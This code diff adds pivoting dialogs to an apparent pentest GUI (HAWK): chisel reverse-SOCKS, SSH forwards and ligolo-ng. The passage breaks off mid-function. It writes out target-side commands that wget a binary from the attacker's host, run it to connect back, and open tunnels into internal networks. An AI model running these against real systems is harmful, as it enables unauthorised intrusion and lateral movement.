@@ -845,6 +845,1107 @@ class CardADRoutesMixin:
         copy_btn.pack(side="left", padx=6)
         _btn(btn_row, "CLOSE", lambda: _safe_destroy(win), w=100)
 
+    def _route_chisel_client(self, tool):
+        """Guided workflow for the chisel reverse-SOCKS tunnel.
+
+        chisel_client's plain runs_on_target dialog only shows the client
+        command — but standing up the tunnel needs FOUR coordinated steps
+        (server on Kali, matching-arch binary transferred to the target,
+        client run, tunnel verified).  This dialog owns all four:
+
+          1. Start `chisel server --port 9000 --reverse` on Kali.
+          2. Download chisel_linux_386 + chisel_linux_amd64 into payloads/
+             (GitHub API resolves the latest tag) and serve payloads/ over
+             HTTP on :8080.
+          3. On the target shell: check arch (uname -m), wget the matching
+             binary to /tmp/chisel, run `chisel client <KALI_IP>:9000
+             R:socks`.
+          4. Verify: watch the server log for the tunnel-up line and probe
+             the resulting SOCKS5 at 127.0.0.1:1080.
+        """
+        from gui.dialogs import (_make_win, _title, _sub, _note_box,
+                                 _btn_row, _btn, _safe_destroy,
+                                 _selectable_text)
+        from utils.runner import _open_terminal, lhost_detect
+        from utils.config import PAYLOADS_DIR
+
+        kali_ip = lhost_detect() or "<KALI_IP>"
+        srv_port = 9000
+        http_port = 8080
+
+        win = _make_win(self, "CHISEL Client — Reverse SOCKS tunnel",
+                        800, 820)
+        _title(win, "🔀  CHISEL — Reverse SOCKS tunnel")
+        _sub(win,
+             "Route Kali's tools through the pivot into its internal network.",
+             COLORS["text_dim"])
+
+        _note_box(win,
+            "HOW IT WORKS\n\n"
+            "Chisel builds a REVERSE tunnel: the server listens on Kali, "
+            "the client runs on the pivot and connects back.  R:socks "
+            "tells the tunnel to publish a SOCKS5 proxy on Kali at "
+            "127.0.0.1:1080 that carries traffic INTO the pivot's "
+            "network.\n\n"
+            "   Internal net  ←→  pivot (client)  ←—— tunnel ——→  "
+            "Kali (server)\n"
+            "                                             "
+            "127.0.0.1:1080 SOCKS5",
+            COLORS["text_cyan"])
+
+        _note_box(win,
+            "⚠  KERNEL REQUIREMENT\n\n"
+            "Modern chisel (built with a recent Go toolchain) uses "
+            "epoll_create1 — kernel 2.6.27+.  On very old targets "
+            "(e.g. Metasploitable 2, kernel 2.6.24) the client crashes "
+            "with \"netpollinit failed\" / \"epollcreate failed with "
+            "38\".\n\n"
+            "Legacy fallbacks (require valid SSH creds):\n"
+            "  • SSHUTTLE — needs Python 2.6+ on target.\n"
+            "  • SSH Dynamic (SOCKS5) — pure SSH, no target-side "
+            "code; the only one that works on Metasploitable 2.",
+            COLORS["border_amber"], text_color=COLORS["text_yellow"])
+
+        # ── Bottom row (CLOSE) — packed FIRST at side=bottom so the
+        # scrollable middle can expand into the remaining space. ─────
+        row = ctk.CTkFrame(win, fg_color="transparent")
+        row.pack(side="bottom", pady=10)
+        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=120)
+
+        # ── Scrollable body — all four Step panels live here so the
+        # mouse wheel scrolls the dialog on small screens (dialog is
+        # ~820px of content on a possibly 700px screen). ─────────────
+        body = ctk.CTkScrollableFrame(
+            win, fg_color="transparent",
+            border_width=0, corner_radius=0)
+        body.pack(fill="both", expand=True, padx=0, pady=0)
+
+        # ── Section frame helper (colour-coded by role) ──────────────
+        # Steps pack into `body` (the scrollable) not `win`.
+        def _section(num, header, color=None):
+            color = color or COLORS["text_yellow"]
+            f = ctk.CTkFrame(body, fg_color=COLORS["bg_card"],
+                             border_color=COLORS["border_dim"],
+                             border_width=1, corner_radius=4)
+            f.pack(fill="x", padx=16, pady=(6, 2))
+            ctk.CTkLabel(f, text=f"  Step {num} — {header}",
+                         font=_f("sm", True), text_color=color,
+                         anchor="w").pack(fill="x", padx=10, pady=(6, 4))
+            return f
+
+        # ── Copy-with-feedback button (netsh_portfwd style, packed by
+        # the caller so we can control side= inside a row) ──
+        def _mk_copy(parent, label, text_source):
+            def _do():
+                txt = text_source() if callable(text_source) else text_source
+                try:
+                    win.clipboard_clear()
+                    win.clipboard_append(txt)
+                    win.update()
+                    btn.configure(text="✓  COPIED")
+                    def _reset():
+                        if btn.winfo_exists():
+                            btn.configure(text=label)
+                    win.after(1500, _reset)
+                except Exception:
+                    pass
+            btn = ctk.CTkButton(parent, text=label, height=26,
+                font=_f("sm", True),
+                fg_color=COLORS["bg_card"],
+                hover_color=COLORS["bg_card_hover"],
+                border_color=COLORS["border_green"], border_width=1,
+                text_color=COLORS["text_green"], corner_radius=3,
+                command=_do)
+            return btn
+
+        def _mk_action(parent, label, on_click):
+            return ctk.CTkButton(parent, text=label, height=26,
+                font=_f("sm", True),
+                fg_color=COLORS["bg_card"],
+                hover_color=COLORS["bg_card_hover"],
+                border_color=COLORS["border_green"], border_width=1,
+                text_color=COLORS["text_green"], corner_radius=3,
+                command=on_click)
+
+        # ═══════════════════════════════════════════════════════════════
+        # STEP 1 — chisel server on Kali
+        # ═══════════════════════════════════════════════════════════════
+        step1 = _section(1, "Start the chisel server on Kali")
+        server_cmd = f"chisel server --port {srv_port} --reverse"
+        _selectable_text(step1, server_cmd, height=32)
+
+        def _run_server_in_xterm():
+            script = (
+                f"echo '═══  HAWK — CHISEL Server (listening :{srv_port})"
+                f"  ═══'; "
+                f"echo 'Client should target: {kali_ip}:{srv_port}'; "
+                f"echo ''; "
+                f"{server_cmd}; "
+                f"read -p 'Press ENTER to close...'")
+            ok = _open_terminal(
+                f"HAWK — CHISEL Server :{srv_port}", script)
+            if hasattr(self.app, "terminal"):
+                self.app.terminal.write(
+                    f"  [+] CHISEL Server started on :{srv_port} in xterm."
+                    if ok
+                    else "  [!] Could not open terminal emulator.",
+                    "success" if ok else "error")
+
+        row1 = ctk.CTkFrame(step1, fg_color="transparent")
+        row1.pack(fill="x", padx=10, pady=(4, 8))
+        _mk_copy(row1, "📋  COPY", server_cmd).pack(
+            side="left", padx=(0, 6))
+        _mk_action(row1, "▶  OPEN IN XTERM",
+                   _run_server_in_xterm).pack(side="left")
+
+        # ═══════════════════════════════════════════════════════════════
+        # STEP 2 — Download binaries + host via HTTP
+        # ═══════════════════════════════════════════════════════════════
+        step2 = _section(2, "Download the chisel binaries and host them")
+        ctk.CTkLabel(step2,
+            text=(f"  Fetches chisel_linux_386 + chisel_linux_amd64 into "
+                  f"{PAYLOADS_DIR}\n  (latest GitHub release), then serves "
+                  f"that directory on :{http_port}."),
+            font=_f("xs"), text_color=COLORS["text_dim"],
+            anchor="w", justify="left").pack(fill="x", padx=10)
+
+        def _download_bins_in_xterm():
+            # Fetch BOTH linux arches — target may be i686 (32-bit) or
+            # x86_64 (64-bit) and we don't know which until uname -m.
+            # Robust version parser: GitHub API pretty-prints JSON so
+            # `"tag_name": "v1.12.0"` has a space after the colon; the
+            # regex tolerates optional whitespace and matches only real
+            # semver-looking tags.  Explicit "did we get a version"
+            # check surfaces API failures (rate limit, DNS, block)
+            # instead of silently skipping the download.
+            dl_cmd = (
+                f"echo '[*] Resolving latest chisel version via GitHub "
+                f"API...'; "
+                f"VER=$(curl -sSL "
+                f"https://api.github.com/repos/jpillora/chisel/"
+                f"releases/latest "
+                f"| grep -oE '\"tag_name\"[[:space:]]*:[[:space:]]*\"v[^\"]+\"' "
+                f"| head -1 | grep -oE 'v[0-9][^\"]*'); "
+                f"if [ -z \"$VER\" ]; then "
+                f"echo '[!] Could not resolve chisel version.'; "
+                f"echo '[!] Fetching raw API response for diagnosis:'; "
+                f"curl -sSL "
+                f"https://api.github.com/repos/jpillora/chisel/"
+                f"releases/latest | head -20; "
+                f"exit 1; "
+                f"fi; "
+                f"echo \"[+] Latest chisel version: $VER\"; "
+                f"for arch in 386 amd64; do "
+                f"echo \"[*] Fetching chisel_${{VER#v}}_linux_$arch.gz ...\"; "
+                f"curl -sSL -o {PAYLOADS_DIR}/chisel_linux_$arch.gz "
+                f"\"https://github.com/jpillora/chisel/releases/"
+                f"download/${{VER}}/chisel_${{VER#v}}_linux_$arch.gz\" && "
+                f"gunzip -f {PAYLOADS_DIR}/chisel_linux_$arch.gz && "
+                f"chmod +x {PAYLOADS_DIR}/chisel_linux_$arch && "
+                f"echo \"[+] chisel_linux_$arch ready\"; "
+                f"done; echo ''; "
+                f"ls -la {PAYLOADS_DIR}/chisel_linux_* 2>/dev/null || "
+                f"echo '[!] No chisel binaries in {PAYLOADS_DIR}/.'")
+            script = (
+                f"echo '═══  HAWK — Downloading chisel binaries  ═══'; "
+                f"{dl_cmd}; "
+                f"read -p 'Press ENTER to close...'")
+            ok = _open_terminal(
+                "HAWK — Download chisel bins", script)
+            if hasattr(self.app, "terminal"):
+                self.app.terminal.write(
+                    f"  [+] Downloading chisel binaries to {PAYLOADS_DIR}."
+                    if ok
+                    else "  [!] Could not open terminal emulator.",
+                    "success" if ok else "error")
+
+        def _start_http_in_xterm():
+            script = (
+                f"echo '═══  HAWK — HTTP server "
+                f"(serving {PAYLOADS_DIR})  ═══'; "
+                f"echo 'Target pulls: http://{kali_ip}:{http_port}/"
+                f"chisel_linux_<arch>'; echo ''; "
+                f"cd {PAYLOADS_DIR!r} && "
+                f"python3 -m http.server {http_port}; "
+                f"read -p 'Press ENTER to close...'")
+            ok = _open_terminal(f"HAWK — HTTP :{http_port}", script)
+            if hasattr(self.app, "terminal"):
+                self.app.terminal.write(
+                    f"  [+] HTTP server started on :{http_port} "
+                    f"(serving {PAYLOADS_DIR})"
+                    if ok
+                    else "  [!] Could not open terminal emulator.",
+                    "success" if ok else "error")
+
+        row2 = ctk.CTkFrame(step2, fg_color="transparent")
+        row2.pack(fill="x", padx=10, pady=(6, 8))
+        _mk_action(row2, "⬇  DOWNLOAD BINARIES",
+                   _download_bins_in_xterm).pack(side="left", padx=(0, 6))
+        _mk_action(row2, f"▶  START HTTP :{http_port}",
+                   _start_http_in_xterm).pack(side="left")
+
+        # ═══════════════════════════════════════════════════════════════
+        # STEP 3 — On the target shell
+        # ═══════════════════════════════════════════════════════════════
+        step3 = _section(3,
+                         "On the target shell: check arch, transfer, run")
+
+        # 3a — arch check
+        arch_cmd = "uname -m"
+        ctk.CTkLabel(step3,
+            text=("  a) Check the target arch first — i686 / i386 → "
+                  "32-bit, x86_64 → 64-bit:"),
+            font=_f("xs", True), text_color=COLORS["text_bright"],
+            anchor="w").pack(fill="x", padx=10, pady=(6, 2))
+        _selectable_text(step3, arch_cmd, height=32)
+        _mk_copy(step3, "📋  COPY uname -m", arch_cmd).pack(
+            anchor="w", padx=10, pady=(0, 6))
+
+        # 3b — transfer
+        wget_32 = (f"wget http://{kali_ip}:{http_port}/chisel_linux_386 "
+                   f"-O /tmp/chisel && chmod +x /tmp/chisel")
+        wget_64 = (f"wget http://{kali_ip}:{http_port}/chisel_linux_amd64 "
+                   f"-O /tmp/chisel && chmod +x /tmp/chisel")
+        ctk.CTkLabel(step3,
+            text=("  b) Transfer the matching binary — pick 32-bit OR "
+                  "64-bit based on the uname output:"),
+            font=_f("xs", True), text_color=COLORS["text_bright"],
+            anchor="w").pack(fill="x", padx=10, pady=(4, 2))
+        _selectable_text(step3, wget_32, height=44)
+        _mk_copy(step3, "📋  COPY 32-bit wget", wget_32).pack(
+            anchor="w", padx=10, pady=(0, 4))
+        _selectable_text(step3, wget_64, height=44)
+        _mk_copy(step3, "📋  COPY 64-bit wget", wget_64).pack(
+            anchor="w", padx=10, pady=(0, 6))
+
+        # 3c — run the client
+        run_cmd = f"/tmp/chisel client {kali_ip}:{srv_port} R:socks"
+        ctk.CTkLabel(step3,
+            text=("  c) Run the client (connects back to Kali; "
+                  "runs in the foreground):"),
+            font=_f("xs", True), text_color=COLORS["text_bright"],
+            anchor="w").pack(fill="x", padx=10, pady=(4, 2))
+        _selectable_text(step3, run_cmd, height=32)
+        _mk_copy(step3, "📋  COPY chisel client", run_cmd).pack(
+            anchor="w", padx=10, pady=(0, 8))
+
+        # ═══════════════════════════════════════════════════════════════
+        # STEP 4 — Verify
+        # ═══════════════════════════════════════════════════════════════
+        step4 = _section(4, "Verify the tunnel is up",
+                         color=COLORS["text_cyan"])
+        ctk.CTkLabel(step4,
+            text=("  On success, the chisel SERVER log prints:\n"
+                  "     session#1: tun: proxy#R:127.0.0.1:1080=>"
+                  "socks: Listening\n\n"
+                  "  Then test the SOCKS5 proxy from Kali against an "
+                  "internal host reachable from the pivot but NOT from "
+                  "Kali directly:"),
+            font=_f("xs"), text_color=COLORS["text_dim"],
+            anchor="w", justify="left").pack(fill="x", padx=10, pady=(6, 4))
+        test_cmd = "curl --socks5 127.0.0.1:1080 http://<INTERNAL_HOST>"
+        _selectable_text(step4, test_cmd, height=32)
+        _mk_copy(step4, "📋  COPY curl test", test_cmd).pack(
+            anchor="w", padx=10, pady=(0, 8))
+
+        # CLOSE row was packed at side=bottom BEFORE the scrollable body
+        # so the wheel-scroll region can expand into the middle.
+
+    def _route_ssh_local_fw(self, tool):
+        """SSH Local Forward launcher — user + local + remote fields.
+
+        `ssh -L <LPORT>:<RHOST>:<RPORT> user@<PIVOT>` opens a listener
+        on Kali:LPORT that tunnels to RHOST:RPORT through the SSH
+        session on the pivot.  Bare RUN has three bugs at once: empty
+        {extra} produces a broken user, {target} slot-conflated
+        between pivot and internal host, and interactive SSH password.
+
+        Availability check first, then a mini dialog for SSH user +
+        the three port/host fields + xterm launch with SSH compat.
+        """
+        if not tool.is_available():
+            self._show_install_dialog(tool)
+            return
+
+        from gui.dialogs import (_make_win, _title, _sub, _note_box,
+                                 _btn_row, _btn, _safe_destroy)
+        from utils.runner import _open_terminal
+
+        pivot = ""
+        try:
+            sess = self.app.session_manager.current
+            pivot = sess.target_ip if sess else ""
+        except Exception:
+            pass
+        pivot = pivot or "<PIVOT_IP>"
+
+        win = _make_win(self, "SSH Local Forward — Reach internal service",
+                        780, 640)
+        _title(win, "🔀  SSH Local Forward")
+        _sub(win,
+             "Tunnel one Kali port to an internal host:port via SSH "
+             "through the pivot.",
+             COLORS["text_dim"])
+
+        _note_box(win,
+            "HOW IT WORKS\n\n"
+            "ssh -L opens a listener on Kali at 127.0.0.1:<LPORT>.  "
+            "Every connection there is forwarded over the SSH channel "
+            "to the pivot, which then dials <RHOST>:<RPORT> from ITS "
+            "network.  Use to reach a single internal service (a DC, "
+            "an intranet web app, a DB) — for full network access "
+            "prefer SSH Dynamic (SOCKS5) or ligolo-ng.\n\n"
+            "   Kali:LPORT  ──SSH──▶  pivot  ──▶  RHOST:RPORT\n\n"
+            "Slot conflation warning: RHOST is the INTERNAL host, "
+            "NOT the pivot.  Reaching the pivot's OWN service is "
+            "possible too — set RHOST=127.0.0.1 (from the pivot's "
+            "point of view).",
+            COLORS["text_cyan"])
+
+        _note_box(win,
+            "⚠  INTERACTIVE — needs the SSH password or key for the "
+            "pivot.  Runs in an xterm; after auth, ssh forks to "
+            "background and the tunnel stays up until you kill it "
+            "(`pkill -f 'ssh -L <LPORT>:'`).",
+            COLORS["border_amber"], text_color=COLORS["text_yellow"])
+
+        # ── Fields ────────────────────────────────────────────────
+        param = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
+                              border_color=COLORS["border_dim"],
+                              border_width=1, corner_radius=4)
+        param.pack(fill="x", padx=16, pady=(8, 4))
+        ctk.CTkLabel(param, text="  Parameters:",
+                     font=_f("sm", True),
+                     text_color=COLORS["text_bright"],
+                     anchor="w").pack(fill="x", padx=10, pady=(8, 4))
+
+        rowf = ctk.CTkFrame(param, fg_color="transparent")
+        rowf.pack(fill="x", padx=10, pady=(0, 8))
+
+        def _field(parent, label, var, width=120, hint=""):
+            f = ctk.CTkFrame(parent, fg_color="transparent")
+            f.pack(side="left", padx=(0, 12))
+            ctk.CTkLabel(f, text=label, font=_f("xs"),
+                         text_color=COLORS["text_dim"],
+                         anchor="w").pack(anchor="w")
+            e = ctk.CTkEntry(f, textvariable=var, width=width, height=28,
+                             font=_f("sm"),
+                             fg_color=COLORS["bg_secondary"],
+                             text_color=COLORS["text_bright"],
+                             border_color=COLORS["border_green"],
+                             border_width=1, corner_radius=3)
+            e.pack()
+            if hint:
+                ctk.CTkLabel(f, text=hint, font=_f("xs"),
+                             text_color=COLORS["text_muted"],
+                             anchor="w").pack(anchor="w")
+            return e
+
+        user_var  = ctk.StringVar(value="")
+        lport_var = ctk.StringVar(value="8080")
+        rhost_var = ctk.StringVar(value="")
+        rport_var = ctk.StringVar(value="80")
+        _field(rowf, "SSH user  (on pivot)", user_var, 140,
+               "required")
+        _field(rowf, "Local port  (Kali)", lport_var, 90,
+               "e.g. 8080")
+        _field(rowf, "Remote host  (internal)", rhost_var, 160,
+               "required — IP visible from pivot")
+        _field(rowf, "Remote port", rport_var, 80,
+               "e.g. 80, 443, 3389")
+
+        ssh_compat = (
+            "-oHostKeyAlgorithms=+ssh-rsa "
+            "-oKexAlgorithms=+diffie-hellman-group1-sha1,"
+            "diffie-hellman-group14-sha1 "
+            "-oCiphers=+aes128-cbc,3des-cbc "
+            "-oPubkeyAcceptedAlgorithms=+ssh-rsa "
+            "-oMACs=+hmac-sha1,hmac-md5")
+
+        # ── Preview ────────────────────────────────────────────────
+        prev = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
+                             border_color=COLORS["border_green"],
+                             border_width=1, corner_radius=4)
+        prev.pack(fill="x", padx=16, pady=4)
+        ctk.CTkLabel(prev, text="  Generated command:",
+                     font=_f("sm", True), text_color=COLORS["text_green"],
+                     anchor="w").pack(fill="x", padx=10, pady=(6, 2))
+        preview_box = ctk.CTkTextbox(prev, height=90,
+            font=("Courier New", 12),
+            fg_color=COLORS["bg_secondary"],
+            text_color=COLORS["text_bright"],
+            border_color=COLORS["border_dim"], border_width=1,
+            corner_radius=3, state="disabled", wrap="word")
+        preview_box.pack(fill="x", padx=10, pady=(0, 8))
+
+        def _refresh(*_):
+            u = user_var.get().strip() or "<SSH_USER>"
+            lp = lport_var.get().strip() or "8080"
+            rh = rhost_var.get().strip() or "<RHOST>"
+            rp = rport_var.get().strip() or "80"
+            cmd = (f"ssh -L {lp}:{rh}:{rp} -f -N {ssh_compat} "
+                   f"{u}@{pivot}")
+            preview_box.configure(state="normal")
+            preview_box.delete("1.0", "end")
+            preview_box.insert("1.0", cmd)
+            preview_box.configure(state="disabled")
+
+        for v in (user_var, lport_var, rhost_var, rport_var):
+            v.trace_add("write", _refresh)
+        _refresh()
+
+        # ── Launch ─────────────────────────────────────────────────
+        def _launch():
+            u = user_var.get().strip()
+            lp = lport_var.get().strip() or "8080"
+            rh = rhost_var.get().strip()
+            rp = rport_var.get().strip() or "80"
+            if not u:
+                if hasattr(self.app, "terminal"):
+                    self.app.terminal.write(
+                        "  [!] SSH user is empty — set it before "
+                        "launching.", "warn")
+                return
+            if not rh:
+                if hasattr(self.app, "terminal"):
+                    self.app.terminal.write(
+                        "  [!] Remote host is empty — set the "
+                        "internal host to reach.", "warn")
+                return
+            for name, port in (("Local port", lp), ("Remote port", rp)):
+                if not port.isdigit() or not (1 <= int(port) <= 65535):
+                    if hasattr(self.app, "terminal"):
+                        self.app.terminal.write(
+                            f"  [!] Invalid {name} '{port}' — 1..65535.",
+                            "warn")
+                    return
+            cmd = (f"ssh -L {lp}:{rh}:{rp} -f -N {ssh_compat} "
+                   f"{u}@{pivot}")
+            script = (
+                f"echo '═══  HAWK — SSH Local Forward  ═══'; "
+                f"echo 'Kali:127.0.0.1:{lp}  →  {pivot}  →  {rh}:{rp}'; "
+                f"echo 'After auth, ssh forks to background — xterm "
+                f"exits.'; "
+                f"echo 'Test with: curl http://127.0.0.1:{lp}/'; "
+                f"echo 'Kill later with: pkill -f \"ssh -L {lp}:\"'; "
+                f"echo ''; "
+                f"{cmd}; "
+                f"echo ''; "
+                f"read -p 'Press ENTER to close (tunnel still up in "
+                f"background)...'")
+            ok = _open_terminal(
+                f"HAWK — SSH Local Fwd :{lp}", script)
+            if hasattr(self.app, "terminal"):
+                self.app.terminal.write(
+                    f"  [+] SSH Local Forward launched — "
+                    f"Kali:{lp} → {rh}:{rp} via {u}@{pivot}"
+                    if ok
+                    else "  [!] Could not open terminal emulator.",
+                    "success" if ok else "error")
+
+        row = _btn_row(win)
+        _btn(row, "▶  OPEN IN XTERM", _launch, primary=True, w=180)
+        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=100)
+
+    def _route_ligolo_proxy(self, tool):
+        """LIGOLO-NG Proxy launcher — xterm launch (interactive CLI).
+
+        The ligolo-ng proxy has its own interactive command-line
+        (session listing, interface_create, start/stop, tunnel select)
+        that HAWK's subprocess pipe can't drive.  Also needs sudo for
+        the TUN interface.  Dedicated launch in xterm.
+        """
+        if not tool.is_available():
+            self._show_install_dialog(tool)
+            return
+
+        from gui.dialogs import (_make_win, _title, _sub, _note_box,
+                                 _btn_row, _btn, _safe_destroy)
+        from utils.runner import _open_terminal, lhost_detect
+        from utils.config import PAYLOADS_DIR
+
+        kali_ip = lhost_detect() or "<KALI_IP>"
+
+        win = _make_win(self, "LIGOLO-NG Proxy — TUN tunnel listener",
+                        720, 620)
+        _title(win, "🔀  LIGOLO-NG Proxy — TUN tunnel listener")
+        _sub(win,
+             "Modern chisel alternative — routes traffic via a real "
+             "TUN interface (no proxychains needed).",
+             COLORS["text_dim"])
+
+        _note_box(win,
+            "HOW IT WORKS\n\n"
+            "The proxy binds :11601 on Kali with a self-signed TLS "
+            "cert and drops into its own interactive prompt.  The "
+            "agent (transferred and run on the pivot) connects back "
+            "on that port; from the prompt you can then create a TUN "
+            "interface (`interface_create`), select a session, and "
+            "route Kali traffic transparently.\n\n"
+            "   Internal net  ←→  pivot (agent)  ←—TLS 11601——→  "
+            "Kali (proxy + TUN)\n\n"
+            "Kali tools (nmap, curl, sqlmap) work UNMODIFIED because "
+            "the TUN takes over routing — no SOCKS to configure.",
+            COLORS["text_cyan"])
+
+        _note_box(win,
+            "⚠  INTERACTIVE — needs sudo (Kali) and drops into "
+            "ligolo's own CLI.  Runs in an xterm so the prompt is "
+            "usable.  Use CTRL+C or `exit` inside the CLI to stop.",
+            COLORS["border_amber"], text_color=COLORS["text_yellow"])
+
+        # After-start hint (agent command on the pivot)
+        agent_hint = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
+                                   border_color=COLORS["border_dim"],
+                                   border_width=1, corner_radius=4)
+        agent_hint.pack(fill="x", padx=16, pady=(6, 4))
+        ctk.CTkLabel(agent_hint,
+            text="  Once the proxy is up, run the agent ON THE PIVOT:",
+            font=_f("sm", True),
+            text_color=COLORS["text_bright"],
+            anchor="w").pack(fill="x", padx=10, pady=(6, 2))
+        agent_cmd = (
+            f"# 64-bit target:\n"
+            f"./ligolo-agent -connect {kali_ip}:11601 -ignore-cert\n"
+            f"# 32-bit target (i686 / i386, e.g. Metasploitable 2):\n"
+            f"./ligolo-agent-386 -connect {kali_ip}:11601 -ignore-cert")
+        agent_tb = ctk.CTkTextbox(agent_hint, height=60,
+            font=("Courier New", 12),
+            fg_color=COLORS["bg_secondary"],
+            text_color=COLORS["text_bright"],
+            border_color=COLORS["border_dim"], border_width=1,
+            corner_radius=3, state="normal", wrap="word")
+        agent_tb.insert("1.0", agent_cmd)
+        agent_tb.configure(state="disabled")
+        agent_tb.pack(fill="x", padx=10, pady=(0, 8))
+
+        # ── Launch ─────────────────────────────────────────────────
+        def _launch():
+            proxy_path = f"{PAYLOADS_DIR}/ligolo-proxy"
+            cmd = (f"sudo {proxy_path} -selfcert "
+                   f"-laddr 0.0.0.0:11601")
+            script = (
+                f"echo '═══  HAWK — LIGOLO-NG Proxy  ═══'; "
+                f"echo 'Kali listens on :11601 (self-signed TLS)'; "
+                f"echo 'Once the agent connects, use `session` then "
+                f"`interface_create --name ligolo` in the prompt.'; "
+                f"echo 'CTRL+C or `exit` to stop.'; "
+                f"echo ''; "
+                f"{cmd}; "
+                f"echo ''; "
+                f"read -p 'Ligolo stopped. Press ENTER to close...'")
+            ok = _open_terminal("HAWK — LIGOLO-NG Proxy :11601", script)
+            if hasattr(self.app, "terminal"):
+                self.app.terminal.write(
+                    "  [+] LIGOLO-NG Proxy launched on :11601 in xterm."
+                    if ok
+                    else "  [!] Could not open terminal emulator.",
+                    "success" if ok else "error")
+
+        row = _btn_row(win)
+        _btn(row, "▶  OPEN IN XTERM", _launch, primary=True, w=180)
+        _btn(row, "CLOSE", lambda: _safe_destroy(win), w=100)
+
+    def _route_ssh_dynamic(self, tool):
+        """SSH Dynamic (SOCKS5) launcher — user field + xterm launch.
+
+        `ssh -D <port> -f -N user@host` opens a SOCKS5 proxy on Kali
+        127.0.0.1:<port> that tunnels connections through the SSH
+        session on the target.  Bare RUN fails identically to
+        sshuttle: empty {extra} produces `-N @target` (invalid), and
+        the SSH password can't be entered in HAWK's subprocess.
+
+        Availability check first, then a mini dialog for SSH user +
+        SOCKS port + xterm launch with legacy SSH compat flags.
+        """
+        if not tool.is_available():
+            self._show_install_dialog(tool)
+            return
+
+        from gui.dialogs import (_make_win, _title, _sub, _note_box,
+                                 _btn_row, _btn, _safe_destroy)
+        from utils.runner import _open_terminal
+
+        target = ""
+        try:
+            sess = self.app.session_manager.current
+            target = sess.target_ip if sess else ""
+        except Exception:
+            pass
+        target = target or "<TARGET_IP>"
+
+        win = _make_win(self, "SSH Dynamic (SOCKS5) — Pivot proxy",
+                        720, 620)
+        _title(win, "🔀  SSH Dynamic (SOCKS5) — Pivot proxy")
+        _sub(win,
+             "Open a SOCKS5 proxy on Kali that tunnels through an SSH "
+             "session on the pivot.",
+             COLORS["text_dim"])
+
+        _note_box(win,
+            "HOW IT WORKS\n\n"
+            "ssh -D <port> -f -N tells SSH to open a SOCKS5 listener "
+            "on Kali at 127.0.0.1:<port>.  Any TCP connection made "
+            "through that proxy is forwarded over the SSH channel and "
+            "exits from the pivot's network stack.  -f backgrounds "
+            "after auth, -N skips the interactive shell.\n\n"
+            "The safest legacy-target tunnel: pure SSH, no target-"
+            "side agent, no Python, no epoll — works on Metasploitable "
+            "2 where chisel and sshuttle fail.",
+            COLORS["text_cyan"])
+
+        _note_box(win,
+            "⚠  INTERACTIVE — needs the SSH password or key for the "
+            "pivot.  Runs in an xterm; after auth, ssh forks to "
+            "background and the SOCKS5 stays available on Kali until "
+            "you kill it (`pkill -f 'ssh -D <port>'` or `kill <pid>`).",
+            COLORS["border_amber"], text_color=COLORS["text_yellow"])
+
+        # ── Fields: SSH user + SOCKS port ─────────────────────────
+        param = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
+                              border_color=COLORS["border_dim"],
+                              border_width=1, corner_radius=4)
+        param.pack(fill="x", padx=16, pady=(8, 4))
+        ctk.CTkLabel(param, text="  Parameters:",
+                     font=_f("sm", True),
+                     text_color=COLORS["text_bright"],
+                     anchor="w").pack(fill="x", padx=10, pady=(8, 4))
+
+        rowf = ctk.CTkFrame(param, fg_color="transparent")
+        rowf.pack(fill="x", padx=10, pady=(0, 8))
+
+        def _field(parent, label, var, width=140, hint=""):
+            f = ctk.CTkFrame(parent, fg_color="transparent")
+            f.pack(side="left", padx=(0, 16))
+            ctk.CTkLabel(f, text=label, font=_f("xs"),
+                         text_color=COLORS["text_dim"],
+                         anchor="w").pack(anchor="w")
+            e = ctk.CTkEntry(f, textvariable=var, width=width, height=28,
+                             font=_f("sm"),
+                             fg_color=COLORS["bg_secondary"],
+                             text_color=COLORS["text_bright"],
+                             border_color=COLORS["border_green"],
+                             border_width=1, corner_radius=3)
+            e.pack()
+            if hint:
+                ctk.CTkLabel(f, text=hint, font=_f("xs"),
+                             text_color=COLORS["text_muted"],
+                             anchor="w").pack(anchor="w")
+            return e
+
+        user_var = ctk.StringVar(value="")
+        port_var = ctk.StringVar(value="1080")
+        _field(rowf, "SSH user  (on pivot)", user_var, 160,
+               "e.g. msfadmin, ubuntu, root  ← required")
+        _field(rowf, "Local SOCKS port  (Kali)", port_var, 100,
+               "default 1080")
+
+        # SSH compat flags — same string used by target_intel_widget's
+        # _COMPAT_FLAGS["ssh"], additive so it doesn't break modern
+        # servers.  Always on: legacy targets (MS2, OpenSSH 4.x) offer
+        # only ssh-rsa/ssh-dss which modern OpenSSH 9.x rejects.
+        ssh_compat = (
+            "-oHostKeyAlgorithms=+ssh-rsa "
+            "-oKexAlgorithms=+diffie-hellman-group1-sha1,"
+            "diffie-hellman-group14-sha1 "
+            "-oCiphers=+aes128-cbc,3des-cbc "
+            "-oPubkeyAcceptedAlgorithms=+ssh-rsa "
+            "-oMACs=+hmac-sha1,hmac-md5")
+
+        # ── Preview ────────────────────────────────────────────────
+        prev = ctk.CTkFrame(win, fg_color=COLORS["bg_card"],
+                             border_color=COLORS["border_green"],
+                             border_width=1, corner_radius=4)
+        prev.pack(fill="x", padx=16, pady=4)
+        ctk.CTkLabel(prev, text="  Generated command:",
+                     font=_f("sm", True), text_color=COLORS["text_green"],
+                     anchor="w").pack(fill="x", padx=10, pady=(6, 2))
+        preview_box = ctk.CTkTextbox(prev, height=80,
+            font=("Courier New", 12),
+            fg_color=COLORS["bg_secondary"],
+            text_color=COLORS["text_bright"],
+            border_color=COLORS["border_dim"], border_width=1,
+            corner_radius=3, state="disabled", wrap="word")
+        preview_box.pack(fill="x", padx=10, pady=(0, 8))
+
+        def _refresh(*_):
+            u = user_var.get().strip() or "<SSH_USER>"
+            p = port_var.get().strip() or "1080"
+            cmd = (f"ssh -D {p} -f -N {ssh_compat} "
+                   f"{u}@{target}")
+            preview_box.configure(state="normal")
+            preview_box.delete("1.0", "end")
+            preview_box.insert("1.0", cmd)
+            preview_box.configure(state="disabled")
+
+        user_var.trace_add("write", _refresh)
+        port_var.trace_add("write", _refresh)
+        _refresh()
+
+        # ── Launch ─────────────────────────────────────────────────
+        def _launch():
+            u = user_var.get().strip()
+            p = port_var.get().strip() or "1080"
+            if not u:
+                if hasattr(self.app, "terminal"):
+                    self.app.terminal.write(
